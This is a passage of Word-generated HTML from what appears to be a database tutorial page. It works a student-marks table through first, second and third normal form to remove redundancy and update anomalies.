New Roman&quot;, &quot;serif&quot;;\">Computer Networks<o:p></o:p></span></p></td><td width=\"55\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 41.55pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">88<o:p></o:p></span></p></td><td width=\"55\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 41.55pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">B<o:p></o:p></span></p></td></tr><tr style=\"height: 12.9pt;\"><td width=\"73\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 54.9pt; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-left: 1pt solid windowtext; border-image: initial; border-top: none; height: 12.9pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">101001<o:p></o:p></span></p></td><td width=\"58\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 43.7pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 12.9pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Arul<o:p></o:p></span></p></td><td width=\"94\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 70.3pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 12.9pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">CSE<o:p></o:p></span></p></td><td width=\"76\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 56.9pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 12.9pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">5<o:p></o:p></span></p></td><td width=\"104\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 77.75pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 12.9pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">CS2304<o:p></o:p></span></p></td><td width=\"99\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 74.1pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 12.9pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">System Software<o:p></o:p></span></p></td><td width=\"55\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 41.55pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 12.9pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">98<o:p></o:p></span></p></td><td width=\"55\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 41.55pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 12.9pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">A<o:p></o:p></span></p></td></tr><tr style=\"height: 13.7pt;\"><td width=\"73\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 54.9pt; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-left: 1pt solid windowtext; border-image: initial; border-top: none; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">101001<o:p></o:p></span></p></td><td width=\"58\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 43.7pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Arul<o:p></o:p></span></p></td><td width=\"94\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 70.3pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">CSE<o:p></o:p></span></p></td><td width=\"76\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 56.9pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">5<o:p></o:p></span></p></td><td width=\"104\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 77.75pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">CS2301<o:p></o:p></span></p></td><td width=\"99\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 74.1pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Software Engineering<o:p></o:p></span></p></td><td width=\"55\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 41.55pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">96<o:p></o:p></span></p></td><td width=\"55\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 41.55pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 13.7pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">A<o:p></o:p></span></p></td></tr><tr style=\"height: 14.45pt;\"><td width=\"73\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 54.9pt; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-left: 1pt solid windowtext; border-image: initial; border-top: none; height: 14.45pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">101001<o:p></o:p></span></p></td><td width=\"58\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 43.7pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 14.45pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Arul<o:p></o:p></span></p></td><td width=\"94\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 70.3pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 14.45pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">CSE<o:p></o:p></span></p></td><td width=\"76\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 56.9pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 14.45pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">5<o:p></o:p></span></p></td><td width=\"104\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 77.75pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 14.45pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">CS2302<o:p></o:p></span></p></td><td width=\"99\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 74.1pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 14.45pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Computer Networks<o:p></o:p></span></p></td><td width=\"55\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 41.55pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 14.45pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">87<o:p></o:p></span></p></td><td width=\"55\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 41.55pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext; height: 14.45pt;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">B<o:p></o:p></span></p></td></tr></tbody></table><table class=\"MsoTableGrid\" border=\"1\" cellspacing=\"0\" cellpadding=\"0\" width=\"610\" style=\"font-weight: bold; width: 457.5pt; border: none;\"><tbody></tbody></table><p class=\"MsoNormal\" style=\"font-weight: bold; line-height: 21px;\"><br></p><p class=\"MsoNormal\" style=\"line-height: 21px;\"><span style=\"font-weight: 700;\"><u><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Questions:</span></u></span></p><p class=\"MsoNormal\" style=\"line-height: 21px;\"><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\">1.Eliminate the redundancy from the above table.</span></p><p class=\"MsoNormal\" style=\"line-height: 21px;\"><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\">2.</span><span style=\"text-indent: -0.25in; font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Eliminate Data manipulation anomalies and Data inconsistency from the above table.</span></p><p class=\"MsoListParagraphCxSpFirst\" style=\"margin-left: 0in; line-height: 21px;\"><span style=\"font-weight: 700;\"><span style=\"font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Solution:</span></span></p><p class=\"MsoListParagraphCxSpLast\" style=\"margin-left: 0in; text-indent: 0in; line-height: 21px;\"><span style=\"font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">1.<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;</span></span><span style=\"font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Normalization eliminates duplicates and data manipulation anomalies from data base.<o:p></o:p></span></p><p class=\"MsoNormal\"><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 17.12px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Relation R&nbsp;</span><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 17.12px; font-family: Wingdings;\">à</span><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 17.12px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\"><o:p></o:p></span></p><p class=\"MsoNormal\" style=\"line-height: 21px;\"><span style=\"text-indent: -0.25in; font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\"></span></p><table class=\"MsoTableGrid\" border=\"1\" cellspacing=\"0\" cellpadding=\"0\" style=\"border: none;\"><tbody><tr style=\"height: 26.6pt;\"><td width=\"73\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 54.9pt; border: 1pt solid windowtext; height: 26.6pt;\"><p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom: 0.0001pt; text-align: center; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Register No<o:p></o:p></span></p></td><td width=\"58\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 43.7pt; border-top: 1pt solid windowtext; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-image: initial; border-left: none; height: 26.6pt;\"><p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom: 0.0001pt; text-align: center; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Name<o:p></o:p></span></p></td><td width=\"94\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 70.3pt; border-top: 1pt solid windowtext; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-image: initial; border-left: none; height: 26.6pt;\"><p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom: 0.0001pt; text-align: center; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Department<o:p></o:p></span></p></td><td width=\"76\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 56.9pt; border-top: 1pt solid windowtext; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-image: initial; border-left: none; height: 26.6pt;\"><p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom: 0.0001pt; text-align: center; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Semester<o:p></o:p></span></p></td><td width=\"104\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 77.75pt; border-top: 1pt solid windowtext; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-image: initial; border-left: none; height: 26.6pt;\"><p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom: 0.0001pt; text-align: center; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Subject_code<o:p></o:p></span></p></td><td width=\"99\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 74.1pt; border-top: 1pt solid windowtext; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-image: initial; border-left: none; height: 26.6pt;\"><p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom: 0.0001pt; text-align: center; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Subject_title<o:p></o:p></span></p></td><td width=\"55\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 41.55pt; border-top: 1pt solid windowtext; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-image: initial; border-left: none; height: 26.6pt;\"><p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom: 0.0001pt; text-align: center; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Marks<o:p></o:p></span></p></td><td width=\"55\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 41.55pt; border-top: 1pt solid windowtext; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-image: initial; border-left: none; height: 26.6pt;\"><p class=\"MsoNormal\" align=\"center\" style=\"margin-bottom: 0.0001pt; text-align: center; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Grade<o:p></o:p></span></p></td></tr></tbody></table></div><div><p class=\"MsoNormal\" style=\"line-height: 21px;\"><span style=\"font-weight: 700;\"><u><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">1<sup style=\"font-size: 12px;\">st</sup>&nbsp;Normal Form<o:p></o:p></span></u></span></p><p class=\"Default\"><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">A relation R is said to be in the first normal form (1 NF) if and only if all the attributes of the relation are atomic in nature.<o:p></o:p></span></p><p class=\"Default\"><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp;</span><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; font-size: 12pt; text-indent: -0.25in;\">There is a repeating group in Relation R, so split it into two as below</span></p><p class=\"MsoNormal\" style=\"line-height: 21px;\"><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: gray;\">R1&nbsp;</span></i><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: Wingdings; color: gray;\">à</span></i><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: gray;\">RegisterNo, Name, Department, semester, Subject_code, Marks and Grade<o:p></o:p></span></i></p><p class=\"MsoNormal\" style=\"line-height: 21px;\"><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: gray;\">R2&nbsp;</span></i><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: Wingdings; color: gray;\">à</span></i><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: gray;\">Subject_code and Subject_title</span></i></p><p class=\"MsoNormal\" style=\"line-height: 21px;\"><span style=\"font-weight: 700;\"><u><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">2<sup style=\"font-size: 12px;\">nd</sup>&nbsp;Normal Form<o:p></o:p></span></u></span></p><p class=\"Default\"><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">A relation R is said to be in the second normal form (2 NF) if and only if it is in the first normal form and no partial dependency exists between non-key attributes and key attributes.<o:p></o:p></span></p><p class=\"Default\" style=\"margin: 12pt 0in 0.0001pt 0.5in; text-indent: -0.25in;\"><span style=\"font-family: Symbol;\">·<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></span><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">There is a partial functional dependency in Relation R1, so split it into two as below.<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"margin-top: 12pt; line-height: 21px;\"><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: gray;\">R11&nbsp;</span></i><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: Wingdings; color: gray;\">à</span></i><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: gray;\">RegisterNo, Name, Department and semester<o:p></o:p></span></i></p><p class=\"MsoNormal\" style=\"line-height: 21px;\"><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: gray;\">R12&nbsp;</span></i><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: Wingdings; color: gray;\">à</span></i><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: gray;\">RegisterNo, Subject_code, Marks and Grade<o:p></o:p></span></i></p><p class=\"MsoNormal\" style=\"line-height: 21px;\"></p><p class=\"MsoNormal\" style=\"line-height: 21px;\"><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: gray;\">R2&nbsp;</span></i><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: Wingdings; color: gray;\">à</span></i><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: gray;\">Subject_code and Subject_title</span></i></p><p class=\"MsoNormal\" style=\"line-height: 21px;\"><span style=\"font-weight: 700;\"><u><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">3<sup style=\"font-size: 12px;\">rd</sup>&nbsp;Normal Form<o:p></o:p></span></u></span></p><p class=\"Default\"><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">A relation R is said to be in the third normal form (3 NF) if and only if it is in the second normal form and no transitive dependency exists between non-key attributes and key attributes.<o:p></o:p></span></p><p class=\"Default\" style=\"margin: 12pt 0in 0.0001pt 0.5in; text-indent: -0.25in;\"><span style=\"font-family: Symbol;\">·<span style=\"font-variant-numeric: normal; font-variant-east-asian: normal; font-stretch: normal; font-size: 7pt; line-height: normal; font-family: &quot;Times New Roman&quot;;\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></span><span style=\"font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">There is a transitive dependency in the Relation R12, so split it into two as below.<o:p></o:p></span></p><p class=\"MsoNormal\" style=\"margin-top: 12pt; line-height: 21px;\"><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: gray;\">R11&nbsp;</span></i><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: Wingdings; color: gray;\">à</span></i><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: gray;\">RegisterNo, Name, Department and semester<o:p></o:p></span></i></p><p class=\"MsoNormal\" style=\"line-height: 21px;\"><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: gray;\">R121&nbsp;</span></i><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: Wingdings; color: gray;\">à</span></i><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: gray;\">RegisterNo, Subject_code, Marks<o:p></o:p></span></i></p><p class=\"MsoNormal\" style=\"line-height: 21px;\"><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: gray;\">R122&nbsp;</span></i><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: Wingdings; color: gray;\">à</span></i><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: gray;\">Min_Marks, Max_Marks and Grade<o:p></o:p></span></i></p><p class=\"MsoNormal\" style=\"line-height: 21px;\"></p><p class=\"MsoNormal\" style=\"line-height: 21px;\"><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: gray;\">R2&nbsp;</span></i><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: Wingdings; color: gray;\">à</span></i><i><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 24px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;; color: gray;\">Subject_code and Subject_title</span></i></p><p class=\"MsoNormal\"><span style=\"font-weight: 700;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; line-height: 17.12px; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Student<o:p></o:p></span></span></p><p class=\"MsoNormal\" style=\"line-height: 21px;\"></p><table class=\"MsoTableGrid\" border=\"1\" cellspacing=\"0\" cellpadding=\"0\" style=\"border: none;\"><tbody><tr><td width=\"150\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 112.7pt; border: 1pt solid windowtext;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">RegisterNo<o:p></o:p></span></p></td><td width=\"150\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 112.7pt; border-top: 1pt solid windowtext; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-image: initial; border-left: none;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Name<o:p></o:p></span></p></td><td width=\"150\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 112.7pt; border-top: 1pt solid windowtext; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-image: initial; border-left: none;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Department<o:p></o:p></span></p></td><td width=\"150\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 112.7pt; border-top: 1pt solid windowtext; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-image: initial; border-left: none;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">Semester<o:p></o:p></span></p></td></tr><tr><td width=\"150\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 112.7pt; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-left: 1pt solid windowtext; border-image: initial; border-top: none;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp;</span></p></td><td width=\"150\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 112.7pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp;</span></p></td><td width=\"150\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 112.7pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp;</span></p></td><td width=\"150\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 112.7pt; border-top: none; border-left: none; border-bottom: 1pt solid windowtext; border-right: 1pt solid windowtext;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, &quot;serif&quot;;\">&nbsp;</span></p></td></tr><tr><td width=\"150\" valign=\"top\" style=\"padding: 0in 5.4pt; width: 112.7pt; border-right: 1pt solid windowtext; border-bottom: 1pt solid windowtext; border-left: 1pt solid windowtext; border-image: initial; border-top: none;\"><p class=\"MsoNormal\" style=\"margin-bottom: 0.0001pt; line-height: normal;\"><span lang=\"EN-IN\" style=\"font-size: 12pt; font-family: &quot;Times New Roman&quot;, 